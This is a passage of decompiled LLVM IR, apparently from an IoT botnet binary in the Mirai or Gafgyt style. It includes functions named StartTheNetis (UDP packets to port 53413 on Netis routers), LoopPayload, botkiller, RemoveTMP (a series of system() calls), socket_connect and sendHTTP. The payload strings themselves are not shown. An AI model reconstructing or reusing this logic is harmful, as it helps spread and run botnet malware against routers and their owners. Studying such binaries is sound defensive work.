  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804d8fd = add i32 %v2_804c976, %v2_804c9ca
  %v4_804d8fd = inttoptr i32 %v3_804d8fd to i8*
  store i8 1, i8* %v4_804d8fd, align 1
  br label %dec_label_pc_804dadc

dec_label_pc_804d907:                             ; preds = %dec_label_pc_804d654
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v1_804c9ce, i32* %eax.global-to-local, align 4
  %v2_804d922 = load i32, i32* %v1_804c9d1, align 4
  store i32 %v2_804d922, i32* %eax.global-to-local, align 4
  %v1_804d924 = add i32 %v2_804d922, 7
  store i32 %v1_804d924, i32* @ebx, align 4
  %v1_804d92a = add i32 %v0_804d6a1, 16
  %v2_804d92a = inttoptr i32 %v1_804d92a to i32*
  store i32 0, i32* %v2_804d92a, align 4
  %v1_804d92c = inttoptr i32 %stack_var_-624.241 to i32*
  %v2_804d92c = call i32 @__GI_time(i32* %v1_804d92c)
  store i32 %v2_804d92c, i32* %eax.global-to-local, align 4
  %v0_804d934 = load i32, i32* @ebx, align 4
  %v7_804d934 = icmp ult i32 %v0_804d934, %v2_804d92c
  %v1_804d936 = icmp eq i1 %v7_804d934, false
  br i1 %v1_804d936, label %dec_label_pc_804dadc, label %dec_label_pc_804d93c

dec_label_pc_804d93c:                             ; preds = %dec_label_pc_804d907
  store i8 0, i8* %v4_804ca1b, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804d96d = add i32 %v2_804c976, %v2_804c9ca
  %v4_804d96d = inttoptr i32 %v3_804d96d to i8*
  store i8 1, i8* %v4_804d96d, align 1
  br label %dec_label_pc_804dadc

dec_label_pc_804d977:                             ; preds = %dec_label_pc_804ca05
  store i32 %storemerge43, i32* @ebx, align 4
  %v0_804d97a = load i32, i32* @esp, align 4
  %v1_804d97d = add i32 %v0_804d97a, -16
  %v2_804d97d = inttoptr i32 %v1_804d97d to i32*
  store i32 0, i32* %v2_804d97d, align 4
  %v1_804d97f = inttoptr i32 %v6_804ca1b to i32*
  %v2_804d97f = call i32 @__GI_time(i32* %v1_804d97f)
  %v0_804d98c = load i32, i32* @ebx, align 4
  %v1_804d98e = mul i32 %v0_804d98c, 4
  store i32 %v1_804d98e, i32* %edx.global-to-local, align 4
  %v2_804d99c = mul i32 %v0_804d98c, 28
  %v2_804d99e = add i32 %v2_804d99c, %v2_804c8ed
  %v1_804d9a0 = add i32 %v2_804d99e, 16
  %v2_804d9a3 = inttoptr i32 %v1_804d9a0 to i32*
  store i32 %v2_804d97f, i32* %v2_804d9a3, align 4
  %v0_804d9a5 = load i32, i32* bitcast ([703 x i8]** @global_var_805f4f8.255 to i32*), align 8
  %v5_804d9af = inttoptr i32 %v0_804d9a5 to i8*
  %v1_804d9b5 = and i32 %v0_804d9a5, -256
  store i32 %v1_804d9b5, i32* %eax.global-to-local, align 4
  store i32 %v0_804d9a5, i32* @edi, align 4
  %v3_804d9be = call i32 @_strlen(i8* %v5_804d9af)
  store i32 %v3_804d9be, i32* @ebx, align 4
  %v0_804d9c7 = load i32, i32* bitcast ([703 x i8]** @global_var_805f4f8.255 to i32*), align 8
  store i32 %v0_804d9c7, i32* @esi, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804d9e3 = inttoptr i32 %v2_804c9cc to i32*
  %v4_804d9e3 = load i32, i32* %v3_804d9e3, align 4
  store i32 %v4_804d9e3, i32* %eax.global-to-local, align 4
  %v0_804d9e6 = load i32, i32* @esp, align 4
  %v1_804d9e6 = add i32 %v0_804d9e6, -4
  %v2_804d9e6 = inttoptr i32 %v1_804d9e6 to i32*
  store i32 16384, i32* %v2_804d9e6, align 4
  %v0_804d9eb = load i32, i32* @ebx, align 4
  %v2_804d9eb = add i32 %v0_804d9e6, -8
  %v3_804d9eb = inttoptr i32 %v2_804d9eb to i32*
  store i32 %v0_804d9eb, i32* %v3_804d9eb, align 4
  %v0_804d9ec = load i32, i32* @esi, align 4
  %v2_804d9ec = add i32 %v0_804d9e6, -12
  %v3_804d9ec = inttoptr i32 %v2_804d9ec to i32*
  store i32 %v0_804d9ec, i32* %v3_804d9ec, align 4
  %v0_804d9ed = load i32, i32* %eax.global-to-local, align 4
  %v2_804d9ed = add i32 %v0_804d9e6, -16
  %v3_804d9ed = inttoptr i32 %v2_804d9ed to i32*
  store i32 %v0_804d9ed, i32* %v3_804d9ed, align 4
  %v5_804d9ee = call i32 @__libc_send(i32 %v0_804d9a5, i32 %stack_var_-624.241, i32 %stack_var_-620.242, i32 %v2_804c8ed)
  %v0_804d9f3 = load i32, i32* @esp, align 4
  %v2_804d9f6 = icmp slt i32 %v5_804d9ee, 0
  %v1_804d9f8 = icmp eq i1 %v2_804d9f6, false
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  br i1 %v1_804d9f8, label %dec_label_pc_804da5a, label %dec_label_pc_804d9fa

dec_label_pc_804d9fa:                             ; preds = %dec_label_pc_804d977
  %v4_804da10 = load i32, i32* %v3_804d9e3, align 4
  store i32 %v4_804da10, i32* %eax.global-to-local, align 4
  %v3_804da16 = inttoptr i32 %v0_804d9f3 to i32*
  store i32 %v4_804da10, i32* %v3_804da16, align 4
  %v2_804da17 = call i32 @sclose(i32 %v0_804d9a5)
  store i8 0, i8* %v4_804ca1b, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804da50 = add i32 %v2_804c976, %v2_804c9ca
  %v4_804da50 = inttoptr i32 %v3_804da50 to i8*
  store i8 1, i8* %v4_804da50, align 1
  br label %dec_label_pc_804dadc

dec_label_pc_804da5a:                             ; preds = %dec_label_pc_804d977
  %v3_804da70 = add i32 %v2_804c976, %v2_804c9ca
  %v4_804da70 = inttoptr i32 %v3_804da70 to i8*
  store i8 3, i8* %v4_804da70, align 1
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v1_804c9ce, i32* %eax.global-to-local, align 4
  %v2_804da90 = load i32, i32* %v1_804c9d1, align 4
  store i32 %v2_804da90, i32* %eax.global-to-local, align 4
  %v1_804da92 = add i32 %v2_804da90, 60
  store i32 %v1_804da92, i32* @ebx, align 4
  %v0_804da95 = load i32, i32* @esp, align 4
  %v1_804da98 = add i32 %v0_804da95, -16
  %v2_804da98 = inttoptr i32 %v1_804da98 to i32*
  store i32 0, i32* %v2_804da98, align 4
  %tmp39 = inttoptr i32 %v0_804d9a5 to i32*
  %v3_804da9a = call i32 @__GI_time(i32* %tmp39)
  store i32 %v3_804da9a, i32* %eax.global-to-local, align 4
  %v0_804daa2 = load i32, i32* @ebx, align 4
  %v7_804daa2 = icmp ult i32 %v0_804daa2, %v3_804da9a
  %v1_804daa4 = icmp eq i1 %v7_804daa2, false
  br i1 %v1_804daa4, label %dec_label_pc_804dadc, label %dec_label_pc_804daa6

dec_label_pc_804daa6:                             ; preds = %dec_label_pc_804da5a
  store i8 0, i8* %v4_804ca1b, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804da70, align 1
  br label %dec_label_pc_804dadc

dec_label_pc_804dadc:                             ; preds = %dec_label_pc_804ca05, %dec_label_pc_804da5a, %dec_label_pc_804d907, %dec_label_pc_804d486, %dec_label_pc_804d1f7, %dec_label_pc_804d0a1, %dec_label_pc_804cc25, %dec_label_pc_804d9fa, %dec_label_pc_804d93c, %dec_label_pc_804d8cc, %dec_label_pc_804d796, %dec_label_pc_804d776, %dec_label_pc_804d707, %dec_label_pc_804d634, %dec_label_pc_804d5f9, %dec_label_pc_804d58c, %dec_label_pc_804d4bb, %dec_label_pc_804d466, %dec_label_pc_804d446, %dec_label_pc_804d3a5, %dec_label_pc_804d36a, %dec_label_pc_804d2fd, %dec_label_pc_804d22c, %dec_label_pc_804d1d7, %dec_label_pc_804d1b7, %dec_label_pc_804d0d6, %dec_label_pc_804d041, %dec_label_pc_804cf50, %dec_label_pc_804cef0, %dec_label_pc_804cda5, %dec_label_pc_804cd60, %dec_label_pc_804cc05, %dec_label_pc_804cbc7, %dec_label_pc_804daa6
  %stack_var_-624.1 = phi i32 [ %stack_var_-624.241, %dec_label_pc_804ca05 ], [ %stack_var_-624.241, %dec_label_pc_804da5a ], [ %stack_var_-624.241, %dec_label_pc_804daa6 ], [ %stack_var_-624.241, %dec_label_pc_804d9fa ], [ %stack_var_-624.241, %dec_label_pc_804d907 ], [ %stack_var_-624.241, %dec_label_pc_804d93c ], [ %stack_var_-624.241, %dec_label_pc_804d8cc ], [ %stack_var_-624.241, %dec_label_pc_804d796 ], [ %stack_var_-624.241, %dec_label_pc_804d776 ], [ %stack_var_-624.241, %dec_label_pc_804d707 ], [ %v4_804d515, %dec_label_pc_804d634 ], [ %v4_804d515, %dec_label_pc_804d5f9 ], [ %v4_804d515, %dec_label_pc_804d58c ], [ %stack_var_-624.241, %dec_label_pc_804d486 ], [ %stack_var_-624.241, %dec_label_pc_804d4bb ], [ %stack_var_-624.241, %dec_label_pc_804d466 ], [ %stack_var_-624.241, %dec_label_pc_804d446 ], [ %stack_var_-624.241, %dec_label_pc_804d3a5 ], [ %stack_var_-624.241, %dec_label_pc_804d36a ], [ %stack_var_-624.241, %dec_label_pc_804d2fd ], [ %stack_var_-624.241, %dec_label_pc_804d1f7 ], [ %stack_var_-624.241, %dec_label_pc_804d22c ], [ %stack_var_-624.241, %dec_label_pc_804d1d7 ], [ %stack_var_-624.241, %dec_label_pc_804d1b7 ], [ %stack_var_-624.241, %dec_label_pc_804d0a1 ], [ %stack_var_-624.241, %dec_label_pc_804d0d6 ], [ %stack_var_-624.241, %dec_label_pc_804d041 ], [ %stack_var_-624.241, %dec_label_pc_804cf50 ], [ %stack_var_-624.241, %dec_label_pc_804cef0 ], [ %stack_var_-624.241, %dec_label_pc_804cc25 ], [ %stack_var_-624.241, %dec_label_pc_804cda5 ], [ %stack_var_-624.241, %dec_label_pc_804cd60 ], [ %stack_var_-624.241, %dec_label_pc_804cc05 ], [ %stack_var_-624.241, %dec_label_pc_804cbc7 ]
  %stack_var_-620.1 = phi i32 [ %stack_var_-620.242, %dec_label_pc_804ca05 ], [ %stack_var_-620.242, %dec_label_pc_804da5a ], [ %stack_var_-620.242, %dec_label_pc_804daa6 ], [ %stack_var_-620.242, %dec_label_pc_804d9fa ], [ %stack_var_-620.242, %dec_label_pc_804d907 ], [ %stack_var_-620.242, %dec_label_pc_804d93c ], [ %stack_var_-620.242, %dec_label_pc_804d8cc ], [ %stack_var_-620.242, %dec_label_pc_804d796 ], [ %stack_var_-620.242, %dec_label_pc_804d776 ], [ %stack_var_-620.242, %dec_label_pc_804d707 ], [ %stack_var_-620.242, %dec_label_pc_804d634 ], [ %stack_var_-620.242, %dec_label_pc_804d5f9 ], [ %stack_var_-620.242, %dec_label_pc_804d58c ], [ %stack_var_-620.242, %dec_label_pc_804d486 ], [ %stack_var_-620.242, %dec_label_pc_804d4bb ], [ %stack_var_-620.242, %dec_label_pc_804d466 ], [ %stack_var_-620.242, %dec_label_pc_804d446 ], [ %v4_804d286, %dec_label_pc_804d3a5 ], [ %v4_804d286, %dec_label_pc_804d36a ], [ %v4_804d286, %dec_label_pc_804d2fd ], [ %stack_var_-620.242, %dec_label_pc_804d1f7 ], [ %stack_var_-620.242, %dec_label_pc_804d22c ], [ %stack_var_-620.242, %dec_label_pc_804d1d7 ], [ %stack_var_-620.242, %dec_label_pc_804d1b7 ], [ %stack_var_-620.242, %dec_label_pc_804d0a1 ], [ %stack_var_-620.242, %dec_label_pc_804d0d6 ], [ %stack_var_-620.242, %dec_label_pc_804d041 ], [ %stack_var_-620.242, %dec_label_pc_804cf50 ], [ %stack_var_-620.242, %dec_label_pc_804cef0 ], [ %stack_var_-620.242, %dec_label_pc_804cc25 ], [ %stack_var_-620.242, %dec_label_pc_804cda5 ], [ %stack_var_-620.242, %dec_label_pc_804cd60 ], [ %stack_var_-620.242, %dec_label_pc_804cc05 ], [ %stack_var_-620.242, %dec_label_pc_804cbc7 ]
  %v4_804dadc = add nuw nsw i32 %storemerge43, 1
  %v15_804dae2 = icmp eq i32 %v4_804dadc, 1000
  br i1 %v15_804dae2, label %dec_label_pc_804c9aa, label %dec_label_pc_804c9b6

; uselistorder directives
  uselistorder i32 %v4_804dadc, { 1, 0, 2 }
  uselistorder i32 %v0_804d585, { 3, 0, 1, 2 }
  uselistorder i32 %v0_804d2f6, { 3, 0, 1, 2 }
  uselistorder i32 %v13_804cf7b, { 1, 0 }
  uselistorder i32 %v0_804cf76, { 2, 0, 1 }
  uselistorder i32 %v0_804ce8b, { 0, 1, 6, 2, 3, 4, 5 }
  uselistorder i32 %v5_804ce86, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804ce36, { 1, 0 }
  uselistorder i32 %v2_804ce1a, { 1, 0 }
  uselistorder i32 %v0_804cd1e, { 2, 0, 1 }
  uselistorder i32 %v12_804ccf6, { 1, 0 }
  uselistorder i32 %v0_804ccf1, { 2, 0, 1 }
  uselistorder i32 %v0_804cc38, { 2, 0, 1 }
  uselistorder i32 %v2_804ca85, { 1, 0 }
  uselistorder i32 %v6_804ca1b, { 9, 8, 6, 7, 5, 3, 4, 2, 1, 11, 10, 12, 0 }
  uselistorder i8* %v4_804ca1b, { 22, 23, 17, 18, 19, 20, 21, 14, 15, 16, 11, 12, 13, 8, 9, 10, 5, 6, 7, 1, 2, 3, 4, 0, 24 }
  uselistorder i32* %v1_804c9d1, { 6, 5, 4, 3, 1, 2, 0, 7 }
  uselistorder i32 %v1_804c9ce, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v2_804c9cc, { 22, 16, 17, 18, 19, 20, 21, 15, 12, 13, 14, 11, 8, 9, 10, 5, 6, 7, 0, 1, 3, 2, 4, 23 }
  uselistorder i32 %v2_804c9ca, { 24, 0, 1, 23, 25, 26, 2, 35, 3, 32, 27, 28, 29, 5, 30, 4, 31, 6, 33, 34, 36, 7, 38, 39, 8, 37, 40, 41, 42, 9, 43, 10, 45, 44, 46, 11, 48, 49, 12, 47, 50, 51, 52, 13, 53, 14, 55, 54, 56, 15, 63, 64, 16, 62, 65, 58, 59, 17, 57, 60, 61, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 19, 78, 18, 79, 80, 20, 81, 83, 21, 82, 22 }
  uselistorder i32 %v1_804c9bc, { 1, 2, 0, 3, 4, 16, 17, 12, 5, 6, 7, 8, 9, 10, 11, 13, 14, 15, 18, 19, 21, 22, 20, 23, 24, 25, 26, 28, 27, 29, 30, 31, 33, 34, 32, 35, 36, 37, 38, 40, 39, 41, 42, 43, 51, 52, 50, 53, 45, 46, 47, 44, 48, 49, 54, 55, 56, 59, 57, 58, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73 }
  uselistorder i32 %stack_var_-624.241, { 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 9, 7, 6, 4, 3, 2, 0, 1, 5, 11, 10, 8 }
  uselistorder i32 %stack_var_-620.242, { 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 17, 16, 15, 12, 11, 10, 7, 6, 5, 4, 3, 2, 0, 1, 9, 8, 14, 13, 18 }
  uselistorder i32 %storemerge43, { 0, 3, 4, 5, 6, 8, 7, 1, 2 }
  uselistorder i32 %v4_804c99b, { 1, 0, 2 }
  uselistorder i32 %storemerge245, { 1, 0 }
  uselistorder i32 %v2_804c976, { 1, 0, 4, 3, 2, 6, 5, 7, 9, 8, 10, 13, 12, 11, 14, 15 }
  uselistorder i32 %v2_804c8ed, { 12, 4, 14, 13, 16, 15, 5, 6, 7, 8, 17, 0, 1, 2, 9, 3, 10, 11 }
  uselistorder i32 %v1_804c899, { 1, 0, 2 }
  uselistorder i32* %stack_var_-608, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32* %stack_var_-600, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-320, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-328, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32* %stack_var_-332, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %stack_var_-336, { 1, 5, 0, 3, 2, 6, 7, 4, 8, 9 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 9, 21, 22, 24, 23, 26, 25, 27, 28, 29, 30, 31, 32, 33, 35, 34, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 48, 47, 49, 50, 51, 52, 53, 55, 54, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 78, 79, 80, 81, 82, 83, 84, 85, 86, 77, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 6, 7, 5, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 17, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 60, 61, 62, 59, 63, 64, 65, 66, 68, 67, 69, 70, 72, 71, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 86, 87, 88, 85, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 100, 101, 99, 102, 103, 104, 105, 106, 107, 108, 111, 109, 110, 112, 113, 114, 115, 116, 117, 118, 119, 121, 120, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 148, 163, 164, 165, 166, 167, 168, 169, 0, 182, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 189, 183, 184, 185, 186, 187, 188 }
  uselistorder i32 ()* @get_telstate_host, { 1, 0 }
  uselistorder i32 ()* @contains_fail, { 2, 1, 0 }
  uselistorder i32 (i32)* @read_until_response, { 2, 1, 0 }
  uselistorder i32 (i32)* @sclose, { 4, 3, 2, 1, 0 }
  uselistorder i8 7, { 1, 2, 0 }
  uselistorder i8 6, { 1, 0 }
  uselistorder i8 5, { 1, 0 }
  uselistorder i32 5000, { 1, 0 }
  uselistorder label %dec_label_pc_804dadc, { 33, 1, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 3, 17, 18, 19, 20, 21, 22, 4, 23, 24, 25, 5, 26, 27, 28, 29, 30, 6, 31, 32, 0 }
  uselistorder label %dec_label_pc_804ca05, { 1, 0 }
  uselistorder label %dec_label_pc_804c9b6, { 1, 0 }
  uselistorder label %dec_label_pc_804c922, { 1, 0 }
}

define i32 @StartTheNetis() local_unnamed_addr {
entry:
  %stack_var_-1068 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v2_804db36 = ptrtoint i32* %stack_var_-44 to i32
  %v2_804db5d = ptrtoint i32* %stack_var_-1068 to i32
  %v4_804db83 = bitcast i32* %stack_var_-1068 to i8*
  br label %dec_label_pc_804dafa

dec_label_pc_804dafa:                             ; preds = %dec_label_pc_804dafa, %entry
  %v5_804db03 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 %v5_804db03, i32* @eax, align 4
  %v1_804db0e = call i32 @NetisRanges(i32 %v5_804db03)
  store i32 2, i32* %stack_var_-44, align 4
  %v1_804db24 = call i32 @htons(i32 53413)
  %v3_804db64 = call i32 @sprintf(i32 %v2_804db5d, i32 ptrtoint ([711 x i8]* @global_var_8059270.257 to i32))
  %v3_804db89 = call i32 @_strlen(i8* %v4_804db83)
  %v7_804dba4 = call i32 @__libc_sendto(i32 %v5_804db03, i32 %v2_804db5d, i32 %v3_804db89, i32 0, i32 %v2_804db36, i32 16)
  br label %dec_label_pc_804dafa
}

define i32 @LoopPayload() local_unnamed_addr {
entry:
  %v2_804dbcc = call i32 @__libc_system(i32 ptrtoint ([704 x i8]* @global_var_8059538.258 to i32))
  ret i32 %v2_804dbcc
}

define i32 @botkiller() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-2180 = alloca i32, align 4
  %stack_var_-2308 = alloca i32, align 4
  %stack_var_-2020 = alloca i32, align 4
  %stack_var_-1056 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804dbe8 = load i32, i32* @edi, align 4
  %v0_804dbe9 = load i32, i32* @esi, align 4
  %v0_804dbea = load i32, i32* @ebx, align 4
  store i32 %v0_804dbea, i32* %stack_var_-16, align 4
  %v2_804dbf1 = ptrtoint i32* %stack_var_-68 to i32
  %tmp32 = bitcast i32* %stack_var_-68 to i8*
  store i32 %v2_804dbf1, i32* @edi, align 4
  store i32 ptrtoint ([9 x i8*]* @global_var_805af20.268 to i32), i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_804dc01 = call i8* @_memcpy(i8* %tmp32, i8* bitcast ([9 x i8*]* @global_var_805af20.268 to i8*), i32 10)
  %v4_804dc19 = bitcast i32* %stack_var_-1056 to i16*
  %v5_804dc19 = call i32 @memcpy(i16* %v4_804dc19, i32 ptrtoint ([247 x i8*]* @global_var_805aae0.509 to i32), i32 988)
  %v4_804dc37 = bitcast i32* %stack_var_-2020 to i16*
  %v5_804dc37 = call i32 @memcpy(i16* %v4_804dc37, i32 ptrtoint ([241 x i8*]* @global_var_805a000.736 to i32), i32 964)
  %v5_804dc4c = icmp sgt i32 %tmp, 0
  br i1 %v5_804dc4c, label %dec_label_pc_804dc52, label %dec_label_pc_804dd30

dec_label_pc_804dc52:                             ; preds = %entry
  %v2_804dc52 = ptrtoint i32* %stack_var_-2308 to i32
  %v4_804dc66 = bitcast i32* %stack_var_-2308 to i8*
  %v5_804dc66 = call i32 @__GI_memset(i8* %v4_804dc66, i32 0, i32 128)
  %v0_804dcba = load i32, i32* @ebp, align 4
  %v4_804dc81 = add i32 %v0_804dcba, -64
  %v5_804dc81 = inttoptr i32 %v4_804dc81 to i32*
  %v6_804dc88 = load i32, i32* %v5_804dc81, align 4
  store i32 %v6_804dc88, i32* @ebx, align 4
  %v6_804dc8f = load i32, i32* %v5_804dc81, align 4
  store i32 %v6_804dc8f, i32* @esi, align 4
  %v6_804dc96 = load i32, i32* %v5_804dc81, align 4
  %v8_804dcad = call i32 @__GI_snprintf(i32 %v2_804dc52, i32 127, i32 ptrtoint ([100 x i8]* @global_var_805af48.737 to i32), i32 %v6_804dc96, i32 %v6_804dc8f, i32 %v6_804dc88)
  %v1_804dcf2 = call i32 @__libc_system(i32 %v2_804dc52)
  %v2_804dd0d = ptrtoint i32* %stack_var_-2180 to i32
  %v3_804dd14 = call i32 @sprintf(i32 %v2_804dd0d, i32 ptrtoint ([14 x i8]* @global_var_805afc9.739 to i32))
  %v1_804dd26 = call i32 @__libc_system(i32 %v2_804dd0d)
  br label %dec_label_pc_804dd3d

dec_label_pc_804dd30:                             ; preds = %entry
  %v1_804dd35 = call i32 @sleep(i32 5)
  br label %dec_label_pc_804dd3d

dec_label_pc_804dd3d:                             ; preds = %dec_label_pc_804dc52, %dec_label_pc_804dd30
  %storemerge = phi i32 [ %v1_804dd35, %dec_label_pc_804dd30 ], [ %v1_804dd26, %dec_label_pc_804dc52 ]
  %v2_804dd40 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804dd40, i32* @ebx, align 4
  store i32 %v0_804dbe9, i32* @esi, align 4
  store i32 %v0_804dbe8, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %v5_804dc81, { 0, 2, 1 }
  uselistorder i32 %v2_804dc52, { 1, 0 }
  uselistorder label %dec_label_pc_804dd3d, { 1, 0 }
}

define i32 @RemoveTMP() local_unnamed_addr {
entry:
  %v2_804dd53 = call i32 @__libc_system(i32 ptrtoint ([43 x i8]* @global_var_805afd8.740 to i32))
  %v2_804dd63 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_805b003.741 to i32))
  %v2_804dd73 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_805b018.742 to i32))
  %v2_804dd83 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_805b003.741 to i32))
  %v2_804dd93 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_805b02e.743 to i32))
  %v2_804dda3 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_805b03c.744 to i32))
  %v2_804ddb3 = call i32 @__libc_system(i32 ptrtoint ([23 x i8]* @global_var_805b047.745 to i32))
  %v2_804ddc3 = call i32 @__libc_system(i32 ptrtoint ([20 x i8]* @global_var_805b05e.746 to i32))
  %v2_804ddd3 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_805b072.747 to i32))
  %v2_804dde3 = call i32 @__libc_system(i32 ptrtoint ([17 x i8]* @global_var_805b07d.748 to i32))
  %v2_804ddf3 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_805b08e.749 to i32))
  %v2_804de03 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_805b09c.750 to i32))
  %v2_804de13 = call i32 @__libc_system(i32 ptrtoint ([36 x i8]* @global_var_805b0b4.751 to i32))
  ret i32 %v2_804de13

; uselistorder directives
  uselistorder i32 (i32)* @__libc_system, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_804de37 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_804de42 = icmp eq i32 %v1_804de37, 0
  %v1_804de46 = icmp eq i1 %v4_804de42, false
  br i1 %v1_804de46, label %dec_label_pc_804de54, label %dec_label_pc_804de48

dec_label_pc_804de48:                             ; preds = %entry
  br label %dec_label_pc_804def9

dec_label_pc_804de54:                             ; preds = %entry
  %v1_804de57 = add i32 %v1_804de37, 12
  %v2_804de57 = inttoptr i32 %v1_804de57 to i32*
  %v3_804de57 = load i32, i32* %v2_804de57, align 4
  %v1_804de5f = add i32 %v1_804de37, 16
  %v2_804de5f = inttoptr i32 %v1_804de5f to i32*
  %v3_804de5f = load i32, i32* %v2_804de5f, align 4
  %v1_804de62 = inttoptr i32 %v3_804de5f to i32*
  %v2_804de62 = load i32, i32* %v1_804de62, align 4
  %v15_804de6b = ptrtoint i32* %stack_var_-24 to i32
  %v3_804de70 = call i32 @bcopy(i32 %v2_804de62, i32 %v15_804de6b, i32 %v3_804de57)
  %v1_804de7b1 = zext i16 %arg2 to i32
  %v1_804de84 = call i32 @htons(i32 %v1_804de7b1)
  store i32 2, i32* %stack_var_-28, align 4
  %v3_804de9f = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_804deaa = ptrtoint i32* %stack_var_-32 to i32
  %v5_804deba = call i32 @__GI_setsockopt(i32 %v3_804de9f, i32 6, i32 1, i32 %v2_804deaa, i32 4)
  %v13_804dec2 = icmp eq i32 %v3_804de9f, -1
  %v1_804dec6 = icmp eq i1 %v13_804dec2, false
  br i1 %v1_804dec6, label %dec_label_pc_804ded1, label %dec_label_pc_804dec8

dec_label_pc_804dec8:                             ; preds = %dec_label_pc_804de54
  br label %dec_label_pc_804def9

dec_label_pc_804ded1:                             ; preds = %dec_label_pc_804de54
  %v2_804de68 = ptrtoint i32* %stack_var_-28 to i32
  %v3_804dedd = call i32 @__libc_connect(i32 %v3_804de9f, i32 %v2_804de68, i32 16)
  %v10_804dee5 = icmp eq i32 %v3_804dedd, -1
  %v1_804dee8 = icmp eq i1 %v10_804dee5, false
  br i1 %v1_804dee8, label %dec_label_pc_804def3, label %dec_label_pc_804deea

dec_label_pc_804deea:                             ; preds = %dec_label_pc_804ded1
  br label %dec_label_pc_804def9

dec_label_pc_804def3:                             ; preds = %dec_label_pc_804ded1
  br label %dec_label_pc_804def9

dec_label_pc_804def9:                             ; preds = %dec_label_pc_804deea, %dec_label_pc_804dec8, %dec_label_pc_804de48, %dec_label_pc_804def3
  %v3_804def9 = phi i32 [ 0, %dec_label_pc_804deea ], [ 0, %dec_label_pc_804dec8 ], [ 0, %dec_label_pc_804de48 ], [ %v3_804de9f, %dec_label_pc_804def3 ]
  ret i32 %v3_804def9

; uselistorder directives
  uselistorder i32 %v3_804de9f, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_804def9, { 3, 0, 1, 2 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-796 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %v0_804df02 = load i32, i32* @ebx, align 4
